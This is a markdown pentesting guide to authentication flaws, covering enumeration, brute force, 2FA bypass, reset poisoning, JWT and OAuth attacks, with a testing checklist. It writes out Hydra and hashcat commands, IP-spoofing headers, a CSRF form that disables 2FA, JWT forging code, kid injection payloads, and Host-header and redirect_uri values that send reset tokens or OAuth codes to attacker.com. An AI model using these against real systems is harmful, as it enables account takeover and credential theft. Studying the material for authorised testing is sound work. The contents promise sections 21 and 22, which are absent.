
---

# 📖 **TABLE OF CONTENTS**

1. [🧠 What is Authentication ?](#1.What-is-Authentication-?)

### 2. [🧾 Authentication vs Authorization](#2.Authentication-vs-Authorization)

3. [⚙️ How Vulnerabilities Arise — Root Causes](#3.⚙️-How-Vulnerabilities-Arise)

### 4. [💥 Impact of Authentication Vulnerabilities](#4.💥-Impact-of-Authentication-Vulnerabilities)

### 5. [🔍 Finding the Authentication Attack Surface](#5.🔍-Finding-the-Authentication-Attack-Surface)

### 6. [👤 Username Enumeration — All Techniques](#6.👤-Username-Enumeration—All-Techniques)

### 7. [💥 Brute Force Attacks](#7.💥-Brute-Force-Attacks)

### 8. [🚧 Bypassing Brute Force Protections](#8.🚧-Bypassing-Brute-Force-Protections)

### 9. [🔑 HTTP Basic Authentication](#9.🔑-HTTP-Basic-Authentication)

### 10. [🛡️ Multi-Factor Authentication ( MFA )](#10.🛡️-Multi-Factor-Authentication-(MFA))

### 11. [🔓 2FA Bypass — All Known Techniques](#11.🔓-2FA-Bypass—All-Known-Techniques)

### 12. [🍪 "Remember Me" Cookie Vulnerabilities](#12.🍪-"Remember-Me"-Cookie-Vulnerabilities)

### 13. [📧 Password Reset — Vulnerabilities & Attacks](#13.📧-Password-Reset—Vulnerabilities-&-Attacks)

### 14. [☠️ Password Reset Poisoning via Host Header](#14.☠️-Password-Reset-Poisoning-via-Host-Header)

### 15. [🔄 Password Change Vulnerabilities](#15.🔄-Password-Change-Vulnerabilities)

### 16. [🪙 JWT Authentication Attacks](#16.🪙-JWT-Authentication-Attacks)

### 17. [📱 OAuth Authentication Vulnerabilities](#17.📱-OAuth-Authentication-Vulnerabilities)

### 18. [🛠️ Tools for Authentication Testing](#18.🛠️-Tools-for-Authentication-Testing)

### 19. [🌍 Real-World CVEs & Bug Bounty Cases](#19.🌍-Real-World-CVEs-&-Bug-Bounty-Cases)

### 20. [📋 Complete Authentication Testing Checklist](#20.📋-Complete-Authentication-Testing-Checklist)

### 21. [📊 Authentication Vulnerability Impact Matrix](#21.📊-Authentication-Vulnerability-Impact-Matrix)

### 22. [🛡️ Developer Best Practices](#22.🛡️-Developer-Best-Practices)

---
---

## **1. What-is-Authentication-?**

---

👉 Authentication is the process of **verifying who the user really is** before granting access. 🔹 It answers one question: _"Are you who you claim to be?"_ 🔹 Without it — anyone can pretend to be anyone.

|Type|Factor|Example|
|---|---|---|
|🔑 Something you **know**|Knowledge|Passwords, PINs, security questions|
|📱 Something you **have**|Possession|OTP via SMS, hardware token, authenticator app|
|🧬 Something you **are**|Inherence|Fingerprint, Face ID, iris scan, typing pattern|

💡 **MFA (Multi-Factor Authentication)** = Combination of **2 or more DIFFERENT factor types**.

> ⚠️ **Important:** Password + Security Question = NOT true MFA — both are the same factor (knowledge)! ✅ **True MFA:** Password (know) + SMS OTP (have) = different factors = real MFA. ⚠️ **Email OTP is also NOT true MFA** — email access also depends on knowing credentials (same factor!).

---

## **2. Authentication-vs-Authorization**

|Concept|Meaning|Example|
|---|---|---|
|✅ **Authentication**|Confirms _who_ you are|"Is this really Carlos123?"|
|🔒 **Authorization**|Confirms _what_ you can do|"Can Carlos123 delete users?"|

💬 Flow: **Authenticate first → then Authorize**

> 🔥 **Why this matters in pentesting:**
> 
> - Auth bypass → you become ANY user (most critical!)
> - Authz bypass → your account does things it shouldn't
> - Auth failure is worse — it bypasses ALL access controls at once!

---

## **3. ⚙️-How-Vulnerabilities-Arise**

---

#### **1️⃣ Weak Brute Force Protection**

- No rate limiting → thousands of attempts per second
- No account lockout → unlimited guesses forever
- Rate limiting resets on successful login → attacker logs into own account periodically → infinite guesses on victim!
- IP blocking that trusts `X-Forwarded-For` → easily spoofed header → bypass!
- Rate limit per endpoint but NOT globally → `/login` protected, `/api/login` is not!

#### **2️⃣ Broken Authentication Logic**

- 2FA step is skippable → navigate directly to post-login page
- 2FA tied to username in a cookie, NOT to the session → change the cookie → bypass!
- Password reset token only validated at GET, not at POST → skip token at submit step
- Auth flow assumes requests come in order — attacker skips steps entirely

#### **3️⃣ Developer False Assumptions**

- "Users can't read our cookies" → Base64 is NOT encryption
- "Rate limiting protects us" → only if it can't be bypassed
- "We validate the token so it's secure" → only if validated at EVERY step, not just one
- "HTTPS makes us safe" → doesn't protect against brute force, logic flaws, or weak tokens

#### **4️⃣ Overly Verbose Error Messages**

- "Invalid username" → confirms username doesn't exist → enumeration!
- "Incorrect password" → confirms username IS valid → even worse!
- Even timing differences can confirm valid usernames without any text difference

🧩 Listed in **OWASP Top 10 – A07:2021 — Identification & Authentication Failures**

---

## **4. 💥-Impact-of-Authentication-Vulnerabilities**

- 👤 **Account Takeover (ATO)** → attacker becomes the victim
- 🧠 **Privilege Escalation** → compromise admin account → full app control
- 📂 **Sensitive Data Exposure** → PII, financial data, private messages
- 🚪 **Expanded Attack Surface** → internal pages inaccessible without auth become reachable
- 💸 **Financial Fraud** → banking, e-commerce, payment systems
- ⚖️ **Compliance Violations** → GDPR, HIPAA, PCI-DSS breaches from ATO

---

## **5. 🔍-Finding-the-Authentication-Attack-Surface**

**👉 Before attacking — map EVERYTHING related to authentication.**

|Area|What to Look For|
|---|---|
|🚪 Login|`/login`, `/signin`, `/auth`, `/api/login`, `/admin/login`|
|📝 Registration|`/register`, `/signup` — reveals username policy|
|🔄 Password Reset|`/forgot-password`, `/reset-password`, `/recover`|
|🔑 Password Change|`/change-password`, `/account/security`|
|📱 MFA Pages|`/two-factor`, `/verify`, `/mfa`, `/otp`|
|🍪 Persistent Login|"Remember me" checkbox → generates persistent cookie|
|🔗 OAuth|"Login with Google/GitHub/Facebook" buttons|
|🎫 API Auth|`/api/token`, `/api/refresh`, `Authorization: Bearer` headers|
|🌐 Basic Auth|`WWW-Authenticate: Basic realm=` in server response|

**What to examine after login -**

- 🍪 Is the session cookie complex and random? Or predictable?
- 🍪 Is there a separate "remember me" cookie?
- 🍪 Cookie flags: `HttpOnly`, `Secure`, `SameSite` present?
- 📦 Any user data stored IN the cookie (base64, encrypted)?
- 📋 Response headers: `WWW-Authenticate`, `Authorization`, debug headers?

---

## **6. 👤-Username-Enumeration—All-Techniques**

---

👉 Enumeration = confirming whether a username/email EXISTS on the system. 🎯 Goal: reduce brute force from (millions of usernames × passwords) → (known usernames × passwords).

---

### **🔎 Technique 1 — Different Error Messages**

|Username State|Vulnerable Response|Safe Response|
|---|---|---|
|Valid username|"Incorrect password"|"Invalid username or password"|
|Invalid username|"Unknown username"|"Invalid username or password"|
|Locked account|"Account is locked"|"Invalid username or password"|

> 💡 Even subtle differences count — a trailing period, different capitalization, or one extra word is enough to enumerate!

**Testing with Burp Intruder -**

- Sniper attack → username field position
- Fixed wrong password that will never be correct
- **Grep - Match** on known error message text
- Results NOT matching the message → those usernames are VALID ✅

---

### **⏱️ Technique 2 — Response Timing Attack**

👉 Valid username → server computes bcrypt/argon2 hash (takes 100–500ms) 👉 Invalid username → server rejects immediately without hashing (takes <5ms)

**To amplify the timing difference:**

- Send a very LONG password (forces longer hash computation for valid usernames)
- Invalid username → no hash computed → still fast regardless of password length!

**Burp Setup:**

- Pitchfork attack: Position 1 = `X-Forwarded-For` (increment per request), Position 2 = username
- Sort by "Response received" / "Response completed" columns
- Highest response time = valid username ✅

---

### **📏 Technique 3 — Response Length Differences**

👉 Even with identical error text, response body size can differ by bytes.

- Valid username → extra hidden fields, account-specific content
- Sort Burp Intruder results by **Length** column → outliers = valid usernames

---

### **📝 Technique 4 — Registration & Password Reset Forms**

|Form|Vulnerable Message|What It Reveals|
|---|---|---|
|Registration|"Username already taken"|That username EXISTS|
|Registration|"Email already registered"|That email EXISTS|
|Password Reset|"A reset link has been sent to that email"|Email is registered|
|Password Reset|"Email not found"|Email is NOT registered|
|Account Lockout|"Your account is locked"|Username is VALID|

> ✅ Safe password reset: "If that email is registered, you'll receive a reset link shortly" (identical for all cases)

> 💡 **WordPress specific:** `/wp-json/wp/v2/users` lists ALL registered users by default — no auth needed!

---

## **7. 💥-Brute-Force-Attacks**

|Attack Type|How It Works|Best Used When|
|---|---|---|
|🔢 Pure Brute Force|Try every character combination|Short PINs (4-6 digit OTPs)|
|📖 Dictionary / Wordlist|Use lists of known common passwords|General password attacks|
|🗄️ Credential Stuffing|Use leaked username:password pairs from breaches|Password reuse detection|
|💨 Password Spraying|One password × many usernames|Avoiding lockout, corporate accounts|
|🎯 Targeted / CUPP|Personalized wordlist from OSINT|Known target (name, birthday, pet)|

**Best Password Spraying Candidates:**

- `Summer2024!`, `Welcome1!`, `Password1!`
- `Company2024!`, `CompanyName123`, `Welcome@2024`

**Wordlist Sources:**

- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt`
- `/usr/share/seclists/Usernames/Names/names.txt`
- `https://github.com/danielmiessler/SecLists`

**Burp Intruder Attack Types:**

|Mode|Use Case|
|---|---|
|🎯 Sniper|One wordlist, one position — single param fuzzing|
|💣 Cluster Bomb|All combinations of username × password lists|
|🔁 Pitchfork|Paired username:password lists (credential stuffing)|
|🪃 Battering Ram|Same payload in all positions simultaneously|

---

### 💡 Single Request Multiple Password Attack (Rate Limit Bypass)

👉 Some apps accept JSON arrays — send multiple passwords in ONE HTTP request!

```json
POST /login
{
  "username": "carlos",
  "password": ["123456", "password", "letmein", "qwerty", "iloveyou", "abc123"]
}
```

- Rate limiter sees: **1 HTTP request** → allows it
- Application processes: **6 password guesses** → bypasses rate limiting!

👉 GraphQL batching equivalent:

```graphql
mutation {
  login1: login(username:"carlos", password:"pass1") { token }
  login2: login(username:"carlos", password:"pass2") { token }
}
```

→ 1 HTTP request = multiple login attempts → rate limiter bypassed!

---

## **8. 🚧-Bypassing-Brute-Force-Protections**

---

### 🌐 Bypass 1 — IP-Based Rate Limiting via Header Spoofing

👉 If app trusts `X-Forwarded-For` to determine client IP → spoof it per request!

**Headers to Try:**

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

**Burp Intruder — Pitchfork with incrementing IP:**

- Position 1: `X-Forwarded-For: §1.2.3.§4` (number payload 1–255)
- Position 2: `password=§wordlist§`
- Each request appears from different IP → never hits rate limit!

---

### 🔒 Bypass 2 — Account Lockout Bypass (Interleave Valid Login)

👉 If "counter resets on successful login" → log into OWN account every N attempts!

```
pass1        ← attempt 1 against carlos
pass2        ← attempt 2 against carlos
pass3        ← attempt 3 against carlos
pass4        ← attempt 4 against carlos
wiener:peter ← OWN valid login → counter resets!
pass5        ← attempt 5 (counter is now 0)
...repeat...
```

- Account lockout threshold = 5 → always stay at 4 → never lock!
- Password spraying (1 password × many accounts) also avoids lockout entirely!

---

### ⏳ Bypass 3 — Slow Brute Force (Under the Radar)

- Rate limit: 10 requests/min → send 9 requests/min → never blocked!
- Turbo Intruder in Burp → set precise request rate
- Slow but completely undetectable by threshold-based systems

---

## **9. 🔑-HTTP-Basic-Authentication**

---

👉 Sends credentials as Base64-encoded `username:password` in every request header.

> ⚠️ Base64 is **NOT** encryption — anyone who intercepts gets plaintext credentials!

**Format:**

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
Decode → user:password
```

**Where Found:**

- Old APIs and internal services
- Admin panels (`/admin`, `/phpmyadmin`)
- Router / IoT device management
- Backup systems, monitoring dashboards

**Default Credentials to Always Try:**

|Username|Password|
|---|---|
|admin|admin|
|admin|password|
|admin|123456|
|root|root|
|root|toor|
|admin|(empty)|
|administrator|administrator|

**Brute Force Commands:**

```bash
hydra -l admin -P rockyou.txt https://target.com \
  http-get /admin -t 4 -V

hydra -L users.txt -P passwords.txt target.com \
  http-get /phpmyadmin

nmap -p 80,443 --script http-brute \
  --script-args http-brute.path=/admin target.com
```

---

## **10. 🛡️-Multi-Factor-Authentication-( MFA )**

---

### **🔄 Standard 2FA Flow**

```
Step 1: User submits username + password
        ↓ Correct credentials
        Server sets: session (partial/pending state)
        ↓ Redirects to 2FA page

Step 2: User receives OTP (SMS/email/authenticator app)
        User submits OTP code at /login2 or /verify
        ↓ OTP verified
        Server upgrades session to FULLY AUTHENTICATED
        ↓ Redirects to dashboard
```

> 🔥 **Key rule:** Session must be in a "PENDING MFA" state — NOT "authenticated" — until OTP is verified!

### **📊 2FA Code Types & Weaknesses**

|Type|Strength|Key Weaknesses|
|---|---|---|
|📱 SMS OTP|Weak|SIM swap, SS7 attacks, interception, no rate limit|
|📧 Email OTP|Weak|Same factor as password (both knowledge-based), email compromise|
|⏰ TOTP (Google Auth)|Medium|Seed leak = all future codes, brute force if no rate limit|
|🔑 Hardware Token (YubiKey)|Strong|Physical theft only, MitM proxy relay still possible|
|📋 Backup Codes|Medium|Often unencrypted in DB, short length = brute forceable|

---

## **11. 🔓-2FA-Bypass—All-Known-Techniques**

---

### **1️⃣ Direct Navigation to Post-Login Page**

👉 After Step 1 → instead of entering OTP → go directly to `/dashboard`

**Test these URLs after completing only Step 1:**

- `/dashboard`
- `/account`
- `/profile`
- `/admin`
- `/my-account`

> If accessible without completing OTP → **2FA is not enforced server-side!**

---

### **2️⃣ Flawed Verification Logic — Cookie Manipulation ( Classic PortSwigger )**

👉 **Vulnerability:** User identity stored in a cookie BETWEEN Step 1 and Step 2.

```
Normal flow:
POST /login → valid credentials → Cookie: account=attacker → /login2

Attacker flow:
POST /login → own valid credentials → Cookie: account=attacker
→ Change cookie: account=carlos ← victim!
→ GET /login2 → generates OTP sent to CARLOS (not attacker)
→ POST /login2 with brute-forced OTP → logged in AS CARLOS!
```

**Burp Workflow -**

1. Log in with own account → get `Cookie: account=wiener`
2. Change cookie to `account=carlos`
3. Send GET `/login2` → triggers OTP to Carlos
4. Intruder on POST `/login2` → payload position on `mfa-code` field
5. Numbers payload: 000000 → 999999
6. Find 302 response → correct code → Carlos's account taken!

> ⚠️ May need Burp Macros to re-login between OTP attempts if session expires

---

### **3️⃣ OTP Brute Force ( No Rate Limit )**

👉 6-digit OTP = 1,000,000 possibilities → brute force all of them!

**Burp Intruder:**

- Payload type: Numbers → From: 000000, To: 999999, Min digits: 6
- Filter by: 302 response or different body length

> 💡 For TOTP (30-second window) → use Turbo Intruder with Macros to re-login and regenerate codes across multiple windows

---

### **4️⃣ OTP Leaked in Response**

👉 Check the HTTP response BEFORE entering the OTP!

|Where to Look|What to Find|
|---|---|
|Response body|`<input type="hidden" name="otp" value="123456">`|
|JSON response|`{"success": true, "code": "123456"}`|
|Response headers|`X-OTP-Debug: 123456`|
|JavaScript variables|`var otpCode = '123456';`|
|Browser console|`console.log` statements revealing OTP|

---

### **5️⃣ Cross-Account OTP Usage**

👉 OTP stored globally → not tied to specific session → can use Account A's OTP on Account B!

**Test:**

1. Create 2 attacker accounts
2. Trigger OTP for account 1 → get code
3. During account 2's OTP step → submit account 1's code
4. If works → OTPs are global → massive vulnerability!

---

### **6️⃣ Response Manipulation**

👉 Intercept server response → change `false` to `true` → client grants access!

```
Original response:  {"success": false, "message": "Incorrect code"}
Modified response:  {"success": true, "message": "Code verified"}
```

**Burp Steps:**

1. Send wrong OTP → intercept the RESPONSE (not request)
2. Modify `false` → `true`, `"error"` → `"success"`
3. Forward modified response → browser accepts it → logged in!

---

### **7️⃣ Rate Limit Reset via "Resend Code"**

👉 Resending OTP resets the attempt counter → brute force in batches!

```
Attempt 1 wrong → counter: 1/5
Attempt 2 wrong → counter: 2/5
Attempt 3 wrong → counter: 3/5
"Resend code" → counter RESETS to 0/5!
Attempt 1 wrong → counter: 1/5
Attempt 2 wrong → counter: 2/5
...never reaches lockout!
```

---

### **8️⃣ Password Reset Disables / Skips 2FA**

- Some apps set a "temporary auth" state during password reset → 2FA NOT enforced
- Some apps disable 2FA when password or email is changed
- If backup codes are all used → some apps disable 2FA entirely → use it as bypass!

---

### **9️⃣ 2FA CSRF — Disable via CSRF Attack**

👉 "Disable 2FA" endpoint has no CSRF token → trick victim into disabling their own 2FA!

```html
<html><body>
<form action="https://target.com/account/2fa/disable" method="POST">
  <input type="hidden" name="confirm" value="true">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

Victim visits attacker's page → 2FA disabled → attacker logs in with just username/password!

---

### **🔟 Old API / Subdomain Bypass**

👉 Main app enforces 2FA but old API endpoints do not!

**Endpoints to check:**

- `/api/v1/login` vs `/api/v2/login` → v1 may skip 2FA
- `m.target.com` → mobile version may have different auth flow
- `staging.target.com` / `dev.target.com` → often no 2FA
- Mobile-specific: `/mobile/login`, `/app/auth`

---

## **12. 🍪-"Remember-Me"-Cookie-Vulnerabilities**

---

### **🔎 Predictable Token Patterns**

|Pattern|Example|Attack|
|---|---|---|
|Base64 of username|`d2llbmVy` → "wiener"|Compute for any user|
|MD5 of username|`da2b2f52...` → MD5("wiener")|Compute MD5("carlos")|
|MD5 of password|`5f4dcc3b...` → MD5("password")|Crack with hashcat|
|Base64(user:MD5(pass))|Decode → reconstruct|Crack hash → rebuild|
|Username + timestamp|`wiener1700000000`|Brute force timestamps|

**How to Test:**

1. Log in with "Remember me" → capture cookie in Burp
2. Burp Decoder → Base64 decode → what do you see?
3. If it's a hash → try `hashcat -a 0 -m 0 HASH rockyou.txt`
4. If predictable → compute for victim's username directly!

**Why cookie brute force beats login brute force:**

- Cookie validation usually has NO rate limiting!
- Can try thousands per second with no lockout risk!
- Burp Intruder → `Cookie: remember_me=§payload§` → no counter to worry about

---

## **13. 📧-Password-Reset—Vulnerabilities-&-Attacks**

---

### **🗺️ Reset Flow Attack Surface**

```
Step 1: Submit email → server finds user         → ATTACK: enumeration
Step 2: Server generates token                   → ATTACK: token prediction
Step 3: Server builds reset URL                  → ATTACK: host header poisoning
Step 4: Sends email to user                      → ATTACK: dangling markup injection
Step 5: User clicks link → GET validates token    → ATTACK: only validated here (not on POST!)
Step 6: User submits new password                → ATTACK: delete token from POST
Step 7: Server resets password + destroys token  → ATTACK: token still valid after reset?
```

---

### **🎲 Attack 1 — Predictable Token Generation**

|Vulnerable Token Format|Attack|
|---|---|
|`MD5(username)`|Compute directly for any username|
|`MD5(email)`|Compute directly for any email|
|`MD5(timestamp)`|Brute force timestamps around reset time|
|Sequential numbers|Guess next in sequence|
|PHP `uniqid()`|Based on microseconds → predictable!|
|Short tokens (< 20 chars)|Small keyspace → brute force|

**Detection:** Request 2 resets for your own account → compare tokens → any pattern?

---

### **❌ Attack 2 — Token Not Validated on POST**

```
Step 5: GET /reset?token=YOUR_TOKEN     ← token validated HERE
Step 6: POST /reset                     ← token NOT validated here!

Attack:
POST /reset
username=carlos&password=hacked&token=   ← empty or deleted token
→ Still changes carlos's password! Critical!
```

**Test:** Intercept POST request → delete the `token` parameter entirely → does it still work?

---

### **♻️ Attack 3 — Token Reuse / No Expiry**

- Token used once → still valid → attacker resets AGAIN after victim already reset
- Token never expires → valid for days, weeks, forever
- Victim resets password → same token still usable!

**Test:** Use your own reset token → reset successfully → try the same token again → if works = vulnerable!

---

## **14. ☠️-Password-Reset-Poisoning-via-Host-Header**

---

### **🎯 What is It ?**

👉 Attacker manipulates the reset link so it points to their domain → victim clicks → token sent to attacker!

### **🔄 Step-by-Step Attack**

**Step 1:** Request reset for victim's account → modify the Host header:

```http
POST /forgot-password HTTP/1.1
Host: attacker.com           ← changed!

username=carlos
```

If vulnerable → victim's email contains: `https://attacker.com/reset?token=VICTIM_TOKEN`

**Step 2:** If direct Host change is blocked (routing breaks) → try override headers:

```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

> 💡 `X-Forwarded-Host` is most effective — doesn't break routing but app reads it for URL construction!

**Step 3:** Capture token at your server → Burp Collaborator is perfect for this:

```
GET /reset?token=abc123XYZ HTTP/1.1
Host: attacker.com
← Token is right there in the URL!
```

**Step 4:** Use stolen token on real site:

```
https://target.com/reset?token=abc123XYZ
→ Reset carlos's password → account taken!
```

---

### **📬 Dangling Markup Injection in Reset Emails**

👉 When you can't change the reset link domain → inject HTML into the email body:

```http
Host: target.com:'<a href="//attacker.com?
```

- Injects an open anchor tag into the email HTML
- Email client fetches the link (auto-prefetch, antivirus scanner)
- Token in the following text becomes part of the URL → sent to attacker!

---

## **15. 🔄-Password-Change-Vulnerabilities**

---

|Vulnerability|Description|Attack|
|---|---|---|
|👤 Username from POST body|App reads username from request, not session|Change username param to victim|
|🚪 No auth required|Page accessible without valid session|Access `/change-password` unauthenticated|
|📨 Error messages leak|Different messages for valid vs invalid current password|Brute force current password!|
|🔓 No session invalidation|Other sessions remain valid after password change|Keep stolen session token active|

**Leaky error message attack:**

```
Submit: current_password=GUESS, new_password=x, confirm=y
"New passwords do not match"   → current password was CORRECT!
"Current password incorrect"   → current password was WRONG!
→ Binary signal to brute force current password without changing anything!
```

---

## **16. 🪙-JWT-Authentication-Attacks**

---

### **🔑 JWT Structure**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (Base64URL)
.
eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ  ← Payload (Base64URL)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

> ⚠️ Payload is just **Base64URL encoded** — NOT encrypted! Anyone can read it! 🔐 Signature SHOULD prevent modification — but JWT attacks break this!

### **🗡️ JWT Attack Methods**

|Attack|What It Does|Tool|
|---|---|---|
|`alg: none`|Remove signature entirely — unsigned token accepted!|JWT Editor (Burp)|
|RS256 → HS256 confusion|Use public key as HMAC secret to forge tokens|JWT Editor → HMAC confusion|
|Weak secret brute force|Crack HMAC secret from rockyou.txt|hashcat -m 16500|
|`kid` parameter injection|SQLi/path traversal in key ID field|Manual Burp|
|`jku` / `x5u` header|Point to attacker's JWKS for key validation|Custom JWKS server|

**Hashcat JWT cracking:**

```bash
hashcat -a 0 -m 16500 \
  eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IndpZW5lciJ9.xxx \
  /usr/share/wordlists/rockyou.txt
```

**After finding weak secret → forge admin token:**

```python
import jwt
payload = {"username": "admin", "role": "admin"}
token = jwt.encode(payload, "secret", algorithm="HS256")
print(token)
```

**`kid` parameter payloads:**

```
kid=../../dev/null         → empty key → sign with empty string!
kid=../../etc/passwd       → path traversal for key file
kid=' UNION SELECT 'hack'-- → SQLi in kid!
```

**Common weak JWT secrets to try:**

- `secret`, `password`, `123456`, `key`, `private`, `jwt_secret`
- `supersecret`, `your-256-bit-secret`, `app_secret`, `hmac_key`

---

## **17. 📱-OAuth-Authentication-Vulnerabilities**

---

### **🔄 OAuth Authorization Code Flow**

```
1. User clicks "Login with Google"
2. App redirects to:
   https://google.com/oauth/authorize?
     client_id=X&
     redirect_uri=https://target.com/callback&
     scope=email&
     state=CSRF_TOKEN               ← validates this is your request!
3. User authorizes at Google
4. Google redirects to:
   https://target.com/callback?code=AUTH_CODE&state=CSRF_TOKEN
5. App backend exchanges code:
   POST /oauth/token (code + client_secret)
6. Gets access_token → fetches user's email
7. Logs user in
```

### **🗡️ OAuth Attack Techniques**

|Attack|Vulnerability|Impact|
|---|---|---|
|`redirect_uri` manipulation|URI not validated → sends code to attacker|Auth code theft → ATO|
|Missing `state` parameter|No CSRF protection → CSRF on OAuth login|Link victim's account to attacker|
|Open redirect on client domain|Use as redirect_uri to steal code via Referer|Code theft without param change|
|Account linking email trust|App trusts email from OAuth without verifying|Login as any user who has that email|

**redirect_uri bypass techniques if exact match is enforced:**

```
https://target.com/callback/../evil     ← path traversal
https://target.com/callback?x=evil     ← parameter append
https://evil.target.com/callback       ← subdomain (open redirect)
https://target.com%2Fattacker.com      ← encoded slash
```

**Stealing code via Referer (open redirect on target.com):**

```
redirect_uri=https://target.com/redirect?url=https://attacker.com
→ OAuth sends code to /redirect
→ /redirect sends user to attacker.com
→ Referer header: https://target.com/redirect?code=STOLEN_CODE
→ attacker.com logs show the code!
```

---

## **18. 🛠️-Tools-for-Authentication-Testing**

|Tool|Purpose|Key Usage|
|---|---|---|
|🧱 **Burp Suite Pro**|Proxy, Intruder, Scanner, Sequencer|Core testing platform|
|🔑 **JWT Editor (BApp)**|JWT decode/modify/attack|alg:none, algorithm confusion|
|⚡ **Turbo Intruder**|High-speed brute force, race conditions|OTP brute force, rate limit bypass|
|🔍 **Param Miner (BApp)**|Discover hidden auth parameters|Unlock hidden debug/admin params|
|🔄 **Auth Analyzer (BApp)**|Test if auth state changes correctly|Session testing|
|🐍 **Hydra**|Multi-protocol brute forcer|SSH, HTTP, FTP, SMTP, RDP|
|🌊 **ffuf**|Fast web fuzzer|Username enumeration, endpoint discovery|
|🔐 **hashcat**|Password and JWT secret cracking|Crack MD5 tokens, JWT (-m 16500)|
|🛠️ **jwt_tool**|Complete JWT testing framework|All JWT attacks in one tool|
|📡 **Burp Collaborator**|Out-of-band token capture|Password reset poisoning|

**Hydra Examples:**

```bash
# HTTP form brute force
hydra -l admin -P rockyou.txt https://target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -t 4 -V

# Username enumeration with ffuf
ffuf -w usernames.txt -u https://target.com/login -X POST \
  -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid username"    ← filter OUT "Invalid username" responses

# JWT secret cracking
hashcat -a 0 -m 16500 TARGET_JWT /usr/share/wordlists/rockyou.txt
```

---

## **19. 🌍-Real-World-CVEs-&-Bug-Bounty-Cases**

---

### 💰 TikTok — Authentication Bypass → Account Takeover ($12,000)

- **Type:** Logic flaw in account recovery flow
- **Impact:** Take over any TikTok account without the password
- **Root Cause:** Recovery session not properly tied to the user being recovered
- **Lesson:** Account recovery flows are FULL authentication mechanisms — test them with the same rigor as main login!

---

### 🏥 Drugs.com — MFA Bypass (Critical, 2024)

- **Type:** Session authenticated before MFA completion
- **Impact:** Bypass 2FA on healthcare platform → access private medical data
- **Root Cause:** Session was set to "authenticated" after Step 1 — MFA was just UI decoration
- **Lesson:** Session must be in "pending MFA" state — NOT authenticated — until OTP is verified!

---

### 🔟 CVE-2026-29000 — pac4j-jwt (CVSS 10.0)

- **Product:** pac4j-jwt library (used in Spring, Dropwizard, Play Framework)
- **Type:** JWE PlainJWT processing bypasses signature verification entirely
- **Attack:** Create unsigned JWT → wrap in JWE with public key → server decrypts → null check skips verification → authenticated as admin!
- **Affected:** pac4j-jwt < 4.5.9 / 5.7.9 / 6.3.3
- **Lesson:** Authentication library bugs affect EVERY app using that library — subscribe to CVE feeds for ALL dependencies!

---

### ☁️ Nextcloud — 2FA Enforcement Bypass ($750)

- **Type:** 2FA enforced on UI but not on API endpoints
- **Impact:** Any user with credentials could skip mandatory 2FA via direct API calls
- **Lesson:** 2FA enforcement must be server-side on EVERY endpoint — not just the UI flow!

---

### 🐛 HackerOne Own Platform — Brute Force Vulnerability (160 Upvotes)

- **Type:** Missing rate limiting on HackerOne's own `/login` endpoint
- **Impact:** Attacker could brute force credentials to access private vulnerability reports (unpatched bugs in major companies!)
- **Irony:** The bug bounty platform that exists to fix vulnerabilities had a basic brute force weakness
- **Lesson:** Rate limiting on login is non-negotiable — even security-focused companies miss it!

---

### 🔗 Password Reset Poisoning — HackerOne Report #226659

- **Type:** `X-Forwarded-Host` header injection → reset link domain changed to attacker's
- **Impact:** Token delivered to attacker → full account takeover
- **Lesson:** NEVER build password reset URLs from ANY request header — use hardcoded config only!

---

## **20. 📋-Complete-Authentication-Testing-Checklist**

---

### 👤 Username Enumeration

- → Compare error messages: valid vs invalid username
- → Compare response LENGTH: valid vs invalid username
- → Compare response TIME: send very long password → timing difference?
- → Test registration: "username already taken" message?
- → Test password reset: different messages for registered vs not?
- → Account lockout reveals valid username!

### 🔐 Brute Force & Rate Limiting

- → Is there a rate limit? How many attempts before block?
- → Test `X-Forwarded-For` bypass → change per request
- → Test all IP override headers (X-Real-IP, X-Client-IP, etc.)
- → Test `X-Forwarded-For: 127.0.0.1` → localhost whitelist bypass?
- → Can successful login reset the counter? → interleave own credentials
- → Test JSON array for multiple passwords in 1 request
- → Test alternative endpoints: `/api/login` vs `/login`
- → Test slow brute force: stay under threshold

### 📱 2FA / MFA

- → Skip step: navigate directly to post-login page after Step 1
- → Check account cookie between steps: can it be changed?
- → OTP brute force: rate limit present? → 000000 to 999999
- → OTP in response body / HTML source / headers?
- → OTP reuse: same code valid multiple times?
- → OTP expiry: how long is code valid?
- → Cross-account OTP: swap codes between 2 test accounts?
- → Rate limit reset via resend code button?
- → CSRF on "disable 2FA" endpoint?
- → Old API version (/api/v1) has 2FA? → bypass via older endpoint
- → Password reset / change disables 2FA?
- → Response manipulation: change false → true in OTP response?

### 🍪 Remember Me Cookies

- → Base64 decode: is it just username?
- → Try MD5(username), MD5(password), MD5(email) as cookie
- → No expiry? Still valid after logout? After password change?
- → Compute cookie value for admin → try as cookie without logging in

### 📧 Password Reset

- → Token prediction: compare 2 tokens → patterns?
- → Host header poisoning: change `Host` → does reset link domain change?
- → `X-Forwarded-Host` poisoning → add header → check reset link
- → Token not re-validated on POST: delete token from POST request
- → Token reuse: use same token twice?
- → Token expiry: works after 1 hour? 24 hours?
- → Username enumeration via reset messages?

### 🔄 Password Change

- → Username from POST body: change param to victim's username
- → No current password required: delete field
- → Error messages leak: which error for wrong current password?
- → Other sessions invalidated after password change?

### 🪙 JWT

- → Decode all 3 parts (Burp Decoder)
- → Try `alg: none` attack (remove signature)
- → Try RS256 → HS256 confusion (use public key as secret)
- → Brute force HMAC secret with hashcat
- → Check `kid` parameter: SQLi? Path traversal?
- → Check `jku` / `x5u`: can you point to own JWKS server?

---

